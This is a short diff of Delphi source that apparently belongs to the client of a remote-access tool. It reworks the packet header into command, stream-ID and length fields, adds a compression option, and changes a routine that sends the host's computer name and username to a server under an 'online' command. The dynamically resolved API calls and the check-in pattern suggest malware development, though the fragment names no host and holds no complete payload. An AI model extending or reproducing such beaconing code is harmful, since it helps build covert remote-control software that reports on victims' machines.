@@ -30,8 +30,11 @@ type
 type
   LPSocketHeader = ^TSocketHeader;
   TSocketHeader = packed Record
-    dwSocketLen: DWORD;
-    bSocketCmd: Byte;
+    bCommand: Byte;
+    dwStreamID: DWORD;
+    dwPacketLen: DWORD;
+    dwDecompressedLen: DWORD;
+    dwTotalLen: DWORD;
   end;
 
 procedure ConnectionLoop(pAPI:PAPIRec);
@@ -45,7 +48,7 @@ begin
   ConnectionLoop(pAPI);
 end;
 
-function SendBuffer(pConn:PConnRec; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
+function SendBuffer(pConn:PConnRec; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer; bCompress:Boolean): Boolean;
 var
   lpszSendBuffer: Pointer;
   szSendBuffer: Array[0..2047] Of WideChar;
@@ -60,8 +63,8 @@ begin
   end;
   with LPSocketHeader(@szSendBuffer)^ do
   begin
-    dwSocketLen := iBufferLen + 1;
-    bSocketCmd := bySocketCmd;
+    dwPacketLen := iBufferLen + 1;
+    bCommand := bySocketCmd;
   end;
   Dec(DWORD(lpszSendBuffer));
   iBufferLen := iBufferLen + SizeOf(TSocketHeader);
@@ -151,8 +154,8 @@ begin
   pFullInformations := pConn.pAPI.xAllocMem(pConn.pAPI, dwLen);
   if pFullInformations <> nil then
   begin
-    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 101);
-    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, (pConn.pAPI.xlstrlenW(pFullInformations) + 1) * 2);
+    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100);
+    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, (pConn.pAPI.xlstrlenW(pFullInformations) + 1) * 2, False);
   end;
   pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
 end;
@@ -223,7 +226,6 @@ end;
 
 procedure ConnectionLoop(pAPI:PAPIRec);
 var
-  hMainSocket:Cardinal;
   WSAData:TWSAData;
   pConn:PConnRec;
   strHost:Array[0..20] of ansiChar;
